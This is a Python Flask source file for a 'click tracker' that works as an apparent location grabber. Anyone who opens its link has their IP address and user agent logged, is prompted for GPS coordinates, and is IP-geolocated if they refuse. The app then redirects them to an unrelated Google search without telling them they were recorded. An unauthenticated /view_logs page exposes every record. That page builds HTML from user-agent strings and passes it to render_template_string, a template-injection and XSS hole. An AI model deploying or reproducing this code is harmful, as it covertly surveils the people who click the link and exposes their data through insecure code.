# app.py

from flask import Flask, request, redirect, render_template_string, render_template
from ip_locator import get_location_from_ip 
import datetime
import sqlite3 
import os 

app = Flask(__name__)

# --- Configuration ---
FINAL_DESTINATION_URL = "https://www.google.com/search?q=location+based+facility+provided"
DATABASE_FILE = 'click_tracker.db'

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip_address TEXT,
            country TEXT,
            city TEXT,
            latitude REAL,
            longitude REAL,
            source TEXT, 
            user_agent TEXT
        )
    """)
    conn.commit()
    conn.close()

# --- Database Logging Function ---
def log_click_data(ip, location, user_agent, source="IP"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = (
        timestamp,
        ip,
        location.get('country', 'N/A'),
        location.get('city', 'N/A'),
        location.get('latitude'),
        location.get('longitude'),
        source, 
        user_agent
    )

    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO clicks (timestamp, ip_address, country, city, latitude, longitude, source, user_agent) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, data)
        
        conn.commit()
        conn.close()
        print(f"--- LOGGED ({source}) --- IP: {ip} | Loc: {location.get('city', 'N/A')}, {location.get('country', 'N/A')} | Coords: {location.get('latitude')}")
        
    except sqlite3.Error as e:
        print(f"SQLite error during logging: {e}")


# =======================================================
#               NEWLY ADDED ROUTES FOR DEPLOYMENT
# =======================================================

# --- NEW: Root Redirect (Solves the "Not Found" Error) ---
@app.route('/')
def root_redirect():
    # Redirects the user from the base URL to the actual start of your tracking logic
    return redirect('/track_click')


# --- NEW: Health Check Route (For Render/Gunicorn Monitoring) ---
@app.route('/health')
def health_check():
    # Returns a simple status code to confirm the application is running
    return "OK", 200 

# =======================================================
#               END NEWLY ADDED ROUTES
# =======================================================


# --- 1. Main Link Click (Entry Point) ---
@app.route('/track_click')
def track_click():
    user_ip = request.remote_addr 
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Redirect to the page that requests GPS location via JavaScript
    return redirect(f"/request_location?ip={user_ip}&ua={user_agent}")


# --- 2. Location Request Page (Serves HTML with JS) ---
@app.route('/request_location')
def request_location():
    # Looks for the file in the 'templates' folder
    return render_template('request_location.html', 
                            user_ip=request.args.get('ip'), 
                            user_agent=request.args.get('ua'))


# --- 3. GPS Location Received (Precise Data) ---
@app.route('/location_received')
def location_received():
    ip = request.args.get('ip')
    ua = request.args.get('ua')
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    
    location_data = {
        "country": "GPS_DATA", 
        "city": "GPS_DATA", 
        "latitude": float(lat), 
        "longitude": float(lon)
    }

    log_click_data(ip, location_data, ua, source="GPS")
    print(f"--- FINAL GPS Location for Facility --- Lat: {lat}, Lon: {lon}")
    
    # Redirect to final destination (e.g., a map, or a localized version of your page)
    return redirect(FINAL_DESTINATION_URL)


# --- 4. Fallback (Location Denied or Failed) ---
@app.route('/fallback')
def fallback():
    ip = request.args.get('ip')
    ua = request.args.get('ua')
    
    # Run IP Geolocation as a fallback
    location_data = get_location_from_ip(ip)
    
    if not location_data:
        location_data = {"country": "Unknown", "city": "Unknown", "latitude": None, "longitude": None}

    # Log the general IP data
    log_click_data(ip, location_data, ua, source="IP_FALLBACK")
    
    return redirect(FINAL_DESTINATION_URL)


# --- 5. View Logs (Admin Route) ---
@app.route('/view_logs')
def view_logs():
    if not os.path.exists(DATABASE_FILE):
        return render_template_string("<h1>Logs</h1><p>Database file not found.</p>")

    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT id, timestamp, ip_address, country, city, latitude, longitude, source, user_agent FROM clicks ORDER BY timestamp DESC")
    logs = cursor.fetchall()
    conn.close()

    html = "<h1>Click Tracking Logs</h1><table border='1' style='width: 100%;'><tr><th>ID</th><th>Time</th><th>IP</th><th>Country</th><th>City</th><th>Lat</th><th>Lon</th><th>Source</th><th>User Agent</th></tr>"
    for row in logs:
        ua_display = row[8][:50] + '...' if len(row[8]) > 50 else row[8]
        html += f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[4]}</td><td>{row[5]}</td><td>{row[6]}</td><td>{row[7]}</td><td>{ua_display}</td></tr>"
    html += "</table>"
    return render_template_string(html)


if __name__ == '__main__':
    init_db() 
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    print("--- Flask GPS/IP Geolocation Tracker Running ---")
    app.run(debug=True, host='127.0.0.1', port=5000)
